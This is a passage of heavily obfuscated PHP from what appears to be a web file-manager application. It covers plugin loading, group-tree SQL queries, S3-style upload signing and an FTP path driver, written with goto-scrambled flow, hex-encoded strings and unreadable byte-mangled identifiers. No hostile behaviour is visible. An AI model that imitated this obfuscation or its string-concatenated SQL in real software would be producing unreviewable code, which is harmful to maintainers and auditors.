"\x53\105\114\x45\x43\124\x20\x2a\40\x46\x52\x4f\115\x20\x28\x53\x45\114\105\x43\124\x20\47{$D™ë«Ø•ğŠ}\137\x63\x68\151\154\144\47\40\141\163\40\x68\141\163\40\106\x52\117\x4d\40\x60{$DÓóŸ¯‰¢˜}\140\x20\x77\150\145\162\x65\40\160\141\x72\x65\156\x74\111\104\x3d{$D™ë«Ø•ğŠ}\x20\154\151\155\151\164\40\61\51\x20\141\x73\x20\x74\x62\x5f{$D™ë«Ø•ğŠ}\x20\x75\x6e\x69\157\156\x20\x61\x6c\154\x20"; if (($fŞ•˜… >= 20 || $eïïöÇ†Ïª == $B®…ë¸Ï¥³ - 1) && $fšÄÖù‡Ô) { $fšÄÖù‡Ô = substr($fšÄÖù‡Ô, 0, -strlen($A¡ÌƒÂèŸé[445])); $E†£æ”çøá = $this->query($fšÄÖù‡Ô); $D²¿Ş˜Ò›¥ = array_merge($D²¿Ş˜Ò›¥, $E†£æ”çøá); $fŞ•˜… = 0; $fšÄÖù‡Ô = $A¡ÌƒÂèŸé[33]; } } goto cùÆß¡Êç; b«Ù¸ÅëŒ: } private function _listAppendChildrenMember(&$cœ—É†íœ¹) { goto b„¹™‹¢•; eì‰‰¦Ïå¿: $Dæ»©çÆÃç = array_to_keyvalue($Dæ»©çÆÃç, $bõ¹®£¼îÈ[446]); foreach ($cœ—É†íœ¹ as &$aí²µø“òš) { $aí²µø“òš[$bõ¹®£¼îÈ[2164]] = isset($Dæ»©çÆÃç[$aí²µø“òš[$bõ¹®£¼îÈ[2079]] . $bõ¹®£¼îÈ[2163]]); } goto c“Œ„ÛĞ·; b„¹™‹¢•: $bõ¹®£¼îÈ =& $_SERVER[Ö¹ñÒÁ²÷]; $BãŒµÅ¿†¥ = $bõ¹®£¼îÈ[357]; $Dæ»©çÆÃç = array(); goto Câ±•ÊŞ™; Câ±•ÊŞ™: $A»ÏÀ¶îÆ = count($cœ—É†íœ¹); $E×·Ë²¹‡ = $this->tablePrefix . $bõ¹®£¼îÈ[2154]; for ($f“­ôÁĞ‡Å = 0, $D»¾ÚáÁÚ = 0; $f“­ôÁĞ‡Å < $A»ÏÀ¶îÆ; $f“­ôÁĞ‡Å++) { $D»¾ÚáÁÚ++; $Aî‘Òï¯ä = $cœ—É†íœ¹[$f“­ôÁĞ‡Å][$bõ¹®£¼îÈ[2079]]; $BãŒµÅ¿†¥ .= "\x53\105\x4c\x45\x43\x54\40\52\40\106\x52\117\115\40\x28\x53\105\x4c\x45\x43\124\x20\47{$Aî‘Òï¯ä}\137\x63\x68\151\154\144\x27\x20\x61\x73\x20\x68\141\163\40\106\122\x4f\x4d\40\140{$E×·Ë²¹‡}\140\40\167\x68\145\162\x65\40\147\162\x6f\x75\x70\111\x44\75{$Aî‘Òï¯ä}\x20\x6c\x69\x6d\x69\x74\40\x31\x29\40\141\163\x20\x74\x62\x5f{$Aî‘Òï¯ä}\x20\x75\x6e\151\x6f\x6e\40\141\154\x6c\x20"; if (($D»¾ÚáÁÚ >= 20 || $f“­ôÁĞ‡Å == $A»ÏÀ¶îÆ - 1) && $BãŒµÅ¿†¥) { $BãŒµÅ¿†¥ = substr($BãŒµÅ¿†¥, 0, -strlen($bõ¹®£¼îÈ[445])); $eô¦§Øå¹Ø = $this->query($BãŒµÅ¿†¥); $Dæ»©çÆÃç = array_merge($Dæ»©çÆÃç, $eô¦§Øå¹Ø); $D»¾ÚáÁÚ = 0; $BãŒµÅ¿†¥ = $bõ¹®£¼îÈ[33]; } } goto eì‰‰¦Ïå¿; c“Œ„ÛĞ·: } private function _listAppendMeta(&$câ¦·ô§Áª, $Aõö¶»°ºó) { $B† ®‰‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $Bµ¤¾ïÇß = array($B† ®‰‚[2079] => array($B† ®‰‚[7], $Aõö¶»°ºó)); $cºÇ§ïÏ‚ = Model($B† ®‰‚[2153])->where($Bµ¤¾ïÇß)->select(); $cºÇ§ïÏ‚ = array_to_keyvalue_group($cºÇ§ïÏ‚, $B† ®‰‚[2079]); foreach ($cºÇ§ïÏ‚ as &$CğåÔ†ƒÄ³) { $CğåÔ†ƒÄ³ = array_to_keyvalue($CğåÔ†ƒÄ³, $B† ®‰‚[89], $B† ®‰‚[355]); } foreach ($câ¦·ô§Áª as &$A‹â„éÂœ—) { $A‹â„éÂœ—[$B† ®‰‚[413]] = array(); if (isset($cºÇ§ïÏ‚[$A‹â„éÂœ—[$B† ®‰‚[2079]]])) { $A‹â„éÂœ—[$B† ®‰‚[413]] = $cºÇ§ïÏ‚[$A‹â„éÂœ—[$B† ®‰‚[2079]]]; } } } protected function parentLevelArray($E™®‘Æ¶˜‘) { $AÜ¢ÈÕÅâ¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $E™®‘Æ¶˜‘ = explode($AÜ¢ÈÕÅâ¼[47], trim($E™®‘Æ¶˜‘, $AÜ¢ÈÕÅâ¼[47])); $E™®‘Æ¶˜‘ = array_remove_value($E™®‘Æ¶˜‘, $AÜ¢ÈÕÅâ¼[464]); return $E™®‘Æ¶˜‘; } private function _listAppendParent(&$EËÓŒÛÎÓƒ) { goto d†é¦‰å±; d†é¦‰å±: $cñ½èà„Ş =& $_SERVER[Ö¹ñÒÁ²÷]; $c±„ŞÑ†•ª = array(); foreach ($EËÓŒÛÎÓƒ as &$cçÑ‹ÔçÛÃ) { $c±„ŞÑ†•ª[$cçÑ‹ÔçÛÃ[$cñ½èà„Ş[2079]]] = $cçÑ‹ÔçÛÃ[$cñ½èà„Ş[28]]; $a„—³Œ–‘ = $this->parentLevelArray($cçÑ‹ÔçÛÃ[$cñ½èà„Ş[455]]); foreach ($a„—³Œ–‘ as $e™¯…¨¨”ø) { if (!isset($c±„ŞÑ†•ª[$e™¯…¨¨”ø])) { $c±„ŞÑ†•ª[$e™¯…¨¨”ø] = 0; } } } goto A²à¼šáÊ; A²à¼šáÊ: $FñÚŸÅÎòÇ = array(); foreach ($c±„ŞÑ†•ª as $b§ˆÔòğƒ => $aóá¼‚ˆ) { if (!$aóá¼‚ˆ) { $FñÚŸÅÎòÇ[] = $b§ˆÔòğƒ; } } if ($FñÚŸÅÎòÇ) { $aô¬¯»÷ = array($cñ½èà„Ş[2152] => array($cñ½èà„Ş[380], $FñÚŸÅÎòÇ)); $cœ…°Ò» = $this->field($cñ½èà„Ş[2165])->where($aô¬¯»÷)->select(); $Eã“ââêÅæ = array_to_keyvalue($cœ…°Ò», $cñ½èà„Ş[2079], $cñ½èà„Ş[28]); $c±„ŞÑ†•ª = array_merge_index($c±„ŞÑ†•ª, $Eã“ââêÅæ); } goto eÔ…‡Ş´§’; eÔ…‡Ş´§’: foreach ($EËÓŒÛÎÓƒ as &$cçÑ‹ÔçÛÃ) { $a„—³Œ–‘ = $this->parentLevelArray($cçÑ‹ÔçÛÃ[$cñ½èà„Ş[455]]); $eœâ˜„È … = $cñ½èà„Ş[33]; foreach ($a„—³Œ–‘ as $e™¯…¨¨”ø) { $eœâ˜„È … .= $c±„ŞÑ†•ª[$e™¯…¨¨”ø] . $cñ½èà„Ş[8]; } if ($a„—³Œ–‘) { $eœâ˜„È … .= $cçÑ‹ÔçÛÃ[$cñ½èà„Ş[28]]; } $cçÑ‹ÔçÛÃ[$cñ½èà„Ş[459]] = str_replace($cñ½èà„Ş[463], $cñ½èà„Ş[8], $eœâ˜„È …); } goto bÂ†Ú™ Œã; bÂ†Ú™ Œã: } private function _listAppendSourceRoot(&$dÄ‘¢¢õ¼, $eË§…ù…›¾) { goto eßˆŠ‘é’ ; eßˆŠ‘é’ : $a˜òæ½íÚ =& $_SERVER[Ö¹ñÒÁ²÷]; $F“ë˜ù“ … = array($a˜òæ½íÚ[367] => SourceModel::TYPE_GROUP, $a˜òæ½íÚ[457] => 0, $a˜òæ½íÚ[452] => array($a˜òæ½íÚ[7], $eË§…ù…›¾)); $b¢¿ ‚¾¡ = $a˜òæ½íÚ[2166]; goto cìÁ•ì¤ßï; aìŠÎÙÕá: foreach ($dÄ‘¢¢õ¼ as &$eÒ™Ãïá ) { $eÒ™Ãïá [$a˜òæ½íÚ[387]] = $D—³‚à˜ïˆ[$eÒ™Ãïá [$a˜òæ½íÚ[2079]]] ? $D—³‚à˜ïˆ[$eÒ™Ãïá [$a˜òæ½íÚ[2079]]] : array(); } goto EÜ‘Îˆé”›; cìÁ•ì¤ßï: $D—³‚à˜ïˆ = Model($a˜òæ½íÚ[749])->order($a˜òæ½íÚ[2167])->field($b¢¿ ‚¾¡)->where($F“ë˜ù“ …)->select(); $D—³‚à˜ïˆ = array_to_keyvalue($D—³‚à˜ïˆ, $a˜òæ½íÚ[452]); $D—³‚à˜ïˆ = array_remove_key($D—³‚à˜ïˆ, $a˜òæ½íÚ[452]); goto aìŠÎÙÕá; EÜ‘Îˆé”›: } protected function resetParentLevel() { $dÃæñ¨¦¤… =& $_SERVER[Ö¹ñÒÁ²÷]; $CäÀ¿ôŸ“Ë = $dÃæñ¨¦¤…[2079]; $bŸ‘£ïÕİ = $this->select(); $bŸ‘£ïÕİ = array_to_keyvalue($bŸ‘£ïÕİ, $CäÀ¿ôŸ“Ë); foreach ($bŸ‘£ïÕİ as $f„»ö…éø) { goto f¨Õ¦¤å; c„øÈÊä•: $AÜ¼¯¯™«„[] = 0; $AÜ¼¯¯™«„ = $dÃæñ¨¦¤…[47] . implode($dÃæñ¨¦¤…[47], array_reverse($AÜ¼¯¯™«„)) . $dÃæñ¨¦¤…[47]; $this->setNamePinyin($f„»ö…éø[$CäÀ¿ôŸ“Ë], $f„»ö…éø[$dÃæñ¨¦¤…[28]]); goto e‚†¶½ª•Ò; f¨Õ¦¤å: $EŒ†˜Ùƒõ© = $f„»ö…éø; $AÜ¼¯¯™«„ = array(); while ($EŒ†˜Ùƒõ©[$dÃæñ¨¦¤…[457]] != 0) { $AÜ¼¯¯™«„[] = $EŒ†˜Ùƒõ©[$dÃæñ¨¦¤…[457]]; $EŒ†˜Ùƒõ© = $bŸ‘£ïÕİ[$EŒ†˜Ùƒõ©[$dÃæñ¨¦¤…[457]]]; } goto c„øÈÊä•; e‚†¶½ª•Ò: $this->where(array($CäÀ¿ôŸ“Ë => $f„»ö…éø[$CäÀ¿ôŸ“Ë]))->save(array($dÃæñ¨¦¤…[521] => $AÜ¼¯¯™«„)); goto eô÷¶·ÑÁ“; eô÷¶·ÑÁ“: } return $bŸ‘£ïÕİ; } public function groupNameAuto($C©ß©ÚË, $f·¼ÒÍîŠÖ) { $e¯¼è¿½Èƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $D‚ã ¦éß = $this->where(array($e¯¼è¿½Èƒ[364] => $C©ß©ÚË))->getField($e¯¼è¿½Èƒ[28], !0); if (!$D‚ã ¦éß || !in_array($f·¼ÒÍîŠÖ, $D‚ã ¦éß)) { return $f·¼ÒÍîŠÖ; } for ($F¡Áç¼­à = 1; $F¡Áç¼­à <= count($D‚ã ¦éß) + 1; $F¡Áç¼­à++) { $f¯·ÇÃÈ = $f·¼ÒÍîŠÖ . "\x28{$F¡Áç¼­à}\x29"; if (!in_array($f¯·ÇÃÈ, $D‚ã ¦éß)) { return $f¯·ÇÃÈ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\160\154\165\147\151\156\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\x73\164\141\x74\165\163", "\x72\x65\147\151\x65\163\x74", "\x63\157\156\146\x69\147"); public function loadList($DÁ»÷‰¥¶Š = false) { $c´Ó·Œõœë = array_to_keyvalue($this->listData(), $_SERVER[Ö¹ñÒÁ²÷][28]); if ($DÁ»÷‰¥¶Š) { return $c´Ó·Œõœë[$DÁ»÷‰¥¶Š]; } return $c´Ó·Œõœë; } public function init() { $CÃ„£¢ÆØ• =& $_SERVER[Ö¹ñÒÁ²÷]; Hook::trigger($CÃ„£¢ÆØ•[2168]); $CöĞÀ“§à‹ = $this->loadPluginList(); foreach ($CöĞÀ“§à‹ as $Fç¸‹ÉÅ => $EÈà°Ğ¿İì) { $d™Ş‘¶ = $this->appAllow($Fç¸‹ÉÅ, $EÈà°Ğ¿İì); if (!$d™Ş‘¶) { continue; } foreach ($EÈà°Ğ¿İì[$CÃ„£¢ÆØ•[2169]] as $dóæ¢‚Î”¿ => $cØÅ”‡µ¼) { Hook::bind($dóæ¢‚Î”¿, $cØÅ”‡µ¼); } } Hook::trigger($CÃ„£¢ÆØ•[2170]); Hook::trigger(ACTION); } public function appAllow($A‘Ğ¨˜¼Î‹, $fåÖƒ»Á¯ï, $AƒšçŒÉğ = true) { $cù†ˆ¬ÙÃ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÒê›ÛĞ‰Á = PLUGIN_DIR . $A‘Ğ¨˜¼Î‹ . $cù†ˆ¬ÙÃ[2171]; if (!is_array($fåÖƒ»Á¯ï) || !is_array($fåÖƒ»Á¯ï[$cù†ˆ¬ÙÃ[2169]]) || !is_file($cÒê›ÛĞ‰Á) || $fåÖƒ»Á¯ï[$cù†ˆ¬ÙÃ[686]] != 1) { return !1; } if ($AƒšçŒÉğ && !Action($cù†ˆ¬ÙÃ[2172])->checkAuth($A‘Ğ¨˜¼Î‹)) { return !1; } return !0; } public function unInstall($Aºé¸ÖÁôš) { $BÌâæ‘Áˆê =& $_SERVER[Ö¹ñÒÁ²÷]; $fí†ÈƒÌ È = $this->loadList($Aºé¸ÖÁôš); if (file_exists(PLUGIN_DIR . $Aºé¸ÖÁôš)) { Hook::apply($Aºé¸ÖÁôš . $BÌâæ‘Áˆê[2173]); } $this->remove($fí†ÈƒÌ È[$BÌâæ‘Áˆê[363]]); } public function changeStatus($AÇ’ÛÕ„¨ , $Eö–”±¾±) { $d•…–ô‡°¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $aê‡Î‚ÅğÈ = $this->loadList($AÇ’ÛÕ„¨ ); if ($Eö–”±¾±) { Hook::apply($AÇ’ÛÕ„¨  . $d•…–ô‡°¯[2174]); } $this->update($aê‡Î‚ÅğÈ[$d•…–ô‡°¯[363]], array($d•…–ô‡°¯[2175] => $Eö–”±¾±)); } public function appRegist($e½Ö…Ş¡ÕÊ, $dù–Ã¨¹è) { $fŒ’‹Ä“°  =& $_SERVER[Ö¹ñÒÁ²÷]; $b¸Ìãæ˜‡ø = $this->loadList($e½Ö…Ş¡ÕÊ); if ($b¸Ìãæ˜‡ø) { $this->update($b¸Ìãæ˜‡ø[$fŒ’‹Ä“° [363]], array($fŒ’‹Ä“° [2169] => $dù–Ã¨¹è)); } else { $f©Óæß²Ì¡ = array($fŒ’‹Ä“° [28] => $e½Ö…Ş¡ÕÊ, $fŒ’‹Ä“° [2169] => $dù–Ã¨¹è, $fŒ’‹Ä“° [686] => 0, $fŒ’‹Ä“° [6] => $this->getConfigDefault($e½Ö…Ş¡ÕÊ)); $this->insert($f©Óæß²Ì¡); } } public function getConfigDefault($A¹Ù­»šÅÕ) { $EÚ…Ç­í =& $_SERVER[Ö¹ñÒÁ²÷]; $b´°Ğê—¤± = array(); $bõœáÄ¼”œ = $this->getPackageJson($A¹Ù­»šÅÕ); if (!$bõœáÄ¼”œ && is_array($bõœáÄ¼”œ[$EÚ…Ç­í[2176]])) { return $b´°Ğê—¤±; } foreach ($bõœáÄ¼”œ[$EÚ…Ç­í[2176]] as $cïÀâ¨ÈÌ => $fä„“¡àñ×) { if (!isset($fä„“¡àñ×[$EÚ…Ç­í[355]]) || isset($b´°Ğê—¤±[$cïÀâ¨ÈÌ])) { continue; } $b´°Ğê—¤±[$cïÀâ¨ÈÌ] = $fä„“¡àñ×[$EÚ…Ç­í[355]]; } return $b´°Ğê—¤±; } public function getPackageJson($E¡Ü³Ë³²) { return Hook::apply($E¡Ü³Ë³² . $_SERVER[Ö¹ñÒÁ²÷][2177]); } public function getConfig($D Ïµù¦‡, $C©¢“øê…‚ = false) { $A„Š‘ê¢À³ =& $_SERVER[Ö¹ñÒÁ²÷]; $a†ŠÛªìèÙ = array(); $a®¨„èÄ† = $this->loadList($D Ïµù¦‡); if ($a®¨„èÄ† && is_array($a®¨„èÄ†[$A„Š‘ê¢À³[6]])) { $a†ŠÛªìèÙ = $a®¨„èÄ†[$A„Š‘ê¢À³[6]]; } if (!$a†ŠÛªìèÙ || $C©¢“øê…‚) { $a†ŠÛªìèÙ = $this->getConfigDefault($D Ïµù¦‡); } return $a†ŠÛªìèÙ; } public function setConfig($e‚”ãÈ‰¨¶, $fÔ„Šãñòç = false) { goto c©†»Í§•®; c©†»Í§•®: $b¤ñÖéØù =& $_SERVER[Ö¹ñÒÁ²÷]; $B½ìÚ¨êÛ = $this->loadList($e‚”ãÈ‰¨¶); if (!$B½ìÚ¨êÛ) { return !1; } goto aº¬¥ƒÊŒƒ; aº¬¥ƒÊŒƒ: if ($fÔ„Šãñòç == !1) { $fÔ„Šãñòç = $this->getConfigDefault($e‚”ãÈ‰¨¶); } $Cã×„øØù = $B½ìÚ¨êÛ[$b¤ñÖéØù[6]]; foreach ($fÔ„Šãñòç as $e¦š¿•š”¯ => $cÃ—äÃñÙ) { $Cã×„øØù[$e¦š¿•š”¯] = is_string($cÃ—äÃñÙ) ? trim($cÃ—äÃñÙ) : $cÃ—äÃñÙ; } goto díöÊ…¦§; díöÊ…¦§: $this->update($B½ìÚ¨êÛ[$b¤ñÖéØù[363]], array($b¤ñÖéØù[6] => $Cã×„øØù)); goto fé®êá‚‘; fé®êá‚‘: } public function viewList() { goto aÆ ¿¥Êõ–; aÆ ¿¥Êõ–: $C¸Š¶ºìĞÉ =& $_SERVER[Ö¹ñÒÁ²÷]; $b”ÊÙÈñ” = $this->loadList(); $this->pluginScan($b”ÊÙÈñ”); goto bÜéÙ; bÜéÙ: $b”ÊÙÈñ” = $this->loadPluginList(); $C†–µçÊˆ = array(); foreach ($b”ÊÙÈñ” as $Fãğ²¬„£Ú => $cèô¤§õè) { unset($cèô¤§õè[$C¸Š¶ºìĞÉ[2169]], $cèô¤§õè[$C¸Š¶ºìĞÉ[6]]); $DË°œùØõç = PLUGIN_DIR . $cèô¤§õè[$C¸Š¶ºìĞÉ[28]] . $C¸Š¶ºìĞÉ[2171]; if (!is_file($DË°œùØõç)) { continue; } $aáÏßê×‹ = Hook::apply($cèô¤§õè[$C¸Š¶ºìĞÉ[28]] . $C¸Š¶ºìĞÉ[2177]); if (is_array($aáÏßê×‹)) { $C†–µçÊˆ[$Fãğ²¬„£Ú] = array_merge($cèô¤§õè, $aáÏßê×‹); } } goto dê‘ì¨íîˆ; dê‘ì¨íîˆ: return $C†–µçÊˆ; goto fŒÁ˜ÓÖ§; fŒÁ˜ÓÖ§: } private function loadPluginList() { $B’ªãÆßœù =& $_SERVER[Ö¹ñÒÁ²÷]; $a¦ä‘áÌ­ = $this->loadList(); if (strtolower(MOD) == $B’ªãÆßœù[2178]) { return $a¦ä‘áÌ­; } $föâÇˆÍ©¦ = Hook::trigger($B’ªãÆßœù[2179], $a¦ä‘áÌ­); if ($a¦ä‘áÌ­ && !$föâÇˆÍ©¦) { die; } return $föâÇˆÍ©¦ ? $föâÇˆÍ©¦ : $a¦ä‘áÌ­; } private function pluginScan($C¡™Å£Ë¨Î) { $F××Ë¿§Ş¡ =& $_SERVER[Ö¹ñÒÁ²÷]; recursion_dir(PLUGIN_DIR, $f…Ç‡¬îİä, $B×§ÁÜ¶Ì›, 0); foreach ($f…Ç‡¬îİä as $BØö‘Ì²š×) { $fÆ×èÌ”îÙ = get_path_this($BØö‘Ì²š×); if (isset($C¡™Å£Ë¨Î[$fÆ×èÌ”îÙ]) || !file_exists($BØö‘Ì²š× . $F××Ë¿§Ş¡[2180]) || !file_exists($BØö‘Ì²š× . $F××Ë¿§Ş¡[2171])) { continue; } Hook::apply($fÆ×èÌ”îÙ . $F××Ë¿§Ş¡[2174]); } } } goto aÅÀËÀ”ËÑ; b·êƒ¤Ô›·: define($_SERVER[Ö¹ñÒÁ²÷][1909], 3); define($_SERVER[Ö¹ñÒÁ²÷][1910], 4); define($_SERVER[Ö¹ñÒÁ²÷][1911], 5); goto d…ÕÄ¦¦Ó˜; Cœ¥‹ ·É: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($F±‰·”ô«) { parent::__construct($F±‰·”ô«); $this->signatureVersion($_SERVER[Ö¹ñÒÁ²÷][196]); } public function uploadFormData($D‰ŒƒèÍ‘, $bííŞ˜¾­ = 3600) { goto fËßˆ´ñÄ‹; FƒØĞ¹»‰Œ: $E£–ßğß ˜ = hash_hmac($FùÔ¥ˆ¢[1130], $AÀÁ÷„¬, $fæ¶Æœ¸Ê‚, !0); $B‚øœ¯ù’¼ = hash_hmac($FùÔ¥ˆ¢[1130], $fòã±ã£Î, $E£–ßğß ˜, !0); $a¯ªƒŠëö‡ = hash_hmac($FùÔ¥ˆ¢[1130], $c©…ì»ºÂô, $B‚øœ¯ù’¼); goto b‘…±­í¸‘; B°éÊ¢öÑ¶: $c©…ì»ºÂô = base64_encode(json_encode($fò˜ç”èŠ­)); $E’Ãâğ×¯• = hash_hmac($FùÔ¥ˆ¢[1130], $AÁ‚ôßÔÄ, $FùÔ¥ˆ¢[1131] . $this->secret, !0); $fæ¶Æœ¸Ê‚ = hash_hmac($FùÔ¥ˆ¢[1130], $this->region, $E’Ãâğ×¯•, !0); goto FƒØĞ¹»‰Œ; b‘…±­í¸‘: $d×‰ìèÊÈï = array($FùÔ¥ˆ¢[195] => $FùÔ¥ˆ¢[33], $FùÔ¥ˆ¢[1132] => $FùÔ¥ˆ¢[33], $FùÔ¥ˆ¢[1091] => $Fğ­øøëá³, $FùÔ¥ˆ¢[1095] => $Cˆ·ÊÉÁğ, $FùÔ¥ˆ¢[1099] => $c©…ì»ºÂô, $FùÔ¥ˆ¢[1133] => $F¢»òŠ¤È, $FùÔ¥ˆ¢[1134] => $CÄØ†‚¶ïÕ, $FùÔ¥ˆ¢[1135] => $B½ôÊ¼—ƒÉ, $FùÔ¥ˆ¢[1136] => $Cº„º¢âçÜ, $FùÔ¥ˆ¢[1137] => $a¯ªƒŠëö‡, $FùÔ¥ˆ¢[165] => $this->getHost()); return $d×‰ìèÊÈï; goto A‘Ã×«ê¾; eÉÆ®Õ½: $AÀÁ÷„¬ = $FùÔ¥ˆ¢[59]; $B½ôÊ¼—ƒÉ = gmdate($FùÔ¥ˆ¢[1121]); $AÁ‚ôßÔÄ = gmdate($FùÔ¥ˆ¢[687]); goto c¬©ã­åŒ; c¬©ã­åŒ: $fòã±ã£Î = $FùÔ¥ˆ¢[1122]; $Cº„º¢âçÜ = $bííŞ˜¾­ . $FùÔ¥ˆ¢[33]; $Cˆ·ÊÉÁğ = $FùÔ¥ˆ¢[1087]; goto Dçíì ‚¾; Dçíì ‚¾: $f”¼”ééöĞ = array($this->accessKey, $AÁ‚ôßÔÄ, $this->region, $AÀÁ÷„¬, $fòã±ã£Î); $F¢»òŠ¤È = implode($FùÔ¥ˆ¢[8], $f”¼”ééöĞ); $fò˜ç”èŠ­ = array($FùÔ¥ˆ¢[1089] => gmdate($FùÔ¥ˆ¢[1088], strtotime($FùÔ¥ˆ¢[1123])), $FùÔ¥ˆ¢[1090] => array(array($FùÔ¥ˆ¢[1092] => $this->bucket), array($FùÔ¥ˆ¢[1091] => $Fğ­øøëá³), array($FùÔ¥ˆ¢[1093], $FùÔ¥ˆ¢[1094], $FùÔ¥ˆ¢[33]), array($FùÔ¥ˆ¢[1093], $FùÔ¥ˆ¢[1124], $FùÔ¥ˆ¢[33]), array($FùÔ¥ˆ¢[1093], $FùÔ¥ˆ¢[1125], $FùÔ¥ˆ¢[33]), array($FùÔ¥ˆ¢[1095] => $Cˆ·ÊÉÁğ), array($FùÔ¥ˆ¢[1126] => $F¢»òŠ¤È), array($FùÔ¥ˆ¢[1127] => $CÄØ†‚¶ïÕ), array($FùÔ¥ˆ¢[1128] => $B½ôÊ¼—ƒÉ), array($FùÔ¥ˆ¢[1129] => $Cº„º¢âçÜ))); goto B°éÊ¢öÑ¶; fËßˆ´ñÄ‹: $FùÔ¥ˆ¢ =& $_SERVER[Ö¹ñÒÁ²÷]; $Fğ­øøëá³ = $FùÔ¥ˆ¢[181]; $CÄØ†‚¶ïÕ = $FùÔ¥ˆ¢[1120]; goto eÉÆ®Õ½; A‘Ã×«ê¾: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($dšÓìè†ØÀ) { parent::__construct(); if (count($dšÓìè†ØÀ) > 0) { $this->_init($dšÓìè†ØÀ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($eŠø²®ŸÅî) { $aÓÑ¤”Ş¬ù =& $_SERVER[Ö¹ñÒÁ²÷]; global $config; $this->appCharset = $config[$aÓÑ¤”Ş¬ù[1138]]; $this->systemCharset = $config[$aÓÑ¤”Ş¬ù[1139]]; if (isset($eŠø²®ŸÅî[$aÓÑ¤”Ş¬ù[1140]]) && $eŠø²®ŸÅî[$aÓÑ¤”Ş¬ù[1140]]) { $this->systemCharset = $eŠø²®ŸÅî[$aÓÑ¤”Ş¬ù[1140]]; } } public function iconvApp($bîª ÆÚƒ°) { return $this->iconvTo($bîª ÆÚƒ°, $this->systemCharset, $this->appCharset); } public function iconvSystem($DÚ²ˆ·™¼Œ) { return $this->iconvTo($DÚ²ˆ·™¼Œ, $this->appCharset, $this->systemCharset); } public function getPathOuter($C…¦ë©†Ãñ) { goto eÀÙ‰æçµ; c¹ÁŞ²ÔÙ¾: if (substr($bšø‰ª¶†•, 0, 2) == $AÕ—ÚÜìÀ[1141]) { $bšø‰ª¶†• = BASIC_PATH . substr($bšø‰ª¶†•, 2); } if (substr($C…¦ë©†Ãñ, 0, 2) == $AÕ—ÚÜìÀ[1141]) { $C…¦ë©†Ãñ = BASIC_PATH . substr($C…¦ë©†Ãñ, 2); } $bšø‰ª¶†• = KodIO::clear($bšø‰ª¶†•); goto Aš¸„Œ·õ; eÀÙ‰æçµ: $AÕ—ÚÜìÀ =& $_SERVER[Ö¹ñÒÁ²÷]; $bšø‰ª¶†• = $this->iconvApp($this->pathBase); $C…¦ë©†Ãñ = $this->iconvApp($C…¦ë©†Ãñ); goto c¹ÁŞ²ÔÙ¾; fÕ¬ó§ÁÁí: return $this->pathDriver . $AÕ—ÚÜìÀ[8] . ltrim($C…¦ë©†Ãñ, $AÕ—ÚÜìÀ[8]); goto e¥™œøÀÂ; Aš¸„Œ·õ: $C…¦ë©†Ãñ = KodIO::clear($C…¦ë©†Ãñ); $C…¦ë©†Ãñ = substr($C…¦ë©†Ãñ, strlen($bšø‰ª¶†•)); if (empty($this->pathDriver)) { return $C…¦ë©†Ãñ; } goto fÕ¬ó§ÁÁí; e¥™œøÀÂ: } private function _init($Dø¹²è’„» = array()) { goto aö’¨Û ¤‡; f˜Ñ†Ì†Ş­: return $Aß‰²¤ë£; goto d¹¹©­ë ›; aö’¨Û ¤‡: $E¯¼ßÚ¾‚İ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!function_exists($E¯¼ßÚ¾‚İ[1142])) { show_json(LNG($E¯¼ßÚ¾‚İ[1143]), !1); } $this->charsetReset($Dø¹²è’„»); goto aÇÇÅŒ‘Ñ…; aÇÇÅŒ‘Ñ…: foreach ($Dø¹²è’„» as $B­¹Ä¯ùÏ£ => $b‘ò–Ë…—±) { if (isset($this->{$B­¹Ä¯ùÏ£})) { $this->{$B­¹Ä¯ùÏ£} = $b‘ò–Ë…—±; } } static $c¿²¦¹‹—ß = array(); $d®İ‘ØÕ…¬ = md5(json_encode($Dø¹²è’„»)); goto A‡ƒ¬˜ğë½; f¿µëÈö¦‹: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $Aß‰²¤ë£ = @ftp_login($this->connect, $this->username, $this->userpass); goto dÄø“¦Öõ½; A‡ƒ¬˜ğë½: if (isset($c¿²¦¹‹—ß[$d®İ‘ØÕ…¬])) { foreach ($c¿²¦¹‹—ß[$d®İ‘ØÕ…¬] as $B­¹Ä¯ùÏ£ => $b‘ò–Ë…—±) { $this->{$B­¹Ä¯ùÏ£} = $b‘ò–Ë…—±; } return !0; } $BÉ…¡¿¡‡´ = parse_url(trim($this->server, $E¯¼ßÚ¾‚İ[8])); $this->host = $BÉ…¡¿¡‡´[$E¯¼ßÚ¾‚İ[165]]; goto aÌ»¢¢­ŒÁ; aÌ»¢¢­ŒÁ: $e³ìåŸÁ«… = isset($BÉ…¡¿¡‡´[$E¯¼ßÚ¾‚İ[164]]) && $BÉ…¡¿¡‡´[$E¯¼ßÚ¾‚İ[164]] == $E¯¼ßÚ¾‚İ[1144] ? !0 : !1; $this->scheme = $e³ìåŸÁ«… ? $E¯¼ßÚ¾‚İ[1145] : $E¯¼ßÚ¾‚İ[1146]; $this->port = isset($BÉ…¡¿¡‡´[$E¯¼ßÚ¾‚İ[166]]) ? $BÉ…¡¿¡‡´[$E¯¼ßÚ¾‚İ[166]] : 21; goto f¿µëÈö¦‹; dÄø“¦Öõ½: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $c¿²¦¹‹—ß[$d®İ‘ØÕ…¬] = array($E¯¼ßÚ¾‚İ[1147] => $this->connect, $E¯¼ßÚ¾‚İ[165] => $this->host, $E¯¼ßÚ¾‚İ[164] => $this->scheme, $E¯¼ßÚ¾‚İ[166] => $this->port); goto f˜Ñ†Ì†Ş­; d¹¹©­ë ›: } private function _isconn() { return is_resource($this->connect); } public function mkfile($E°í‚Ÿ‹ƒ, $D¡ÉêóšË† = '', $dÇ“í½±Ã = REPEAT_RENAME) { if 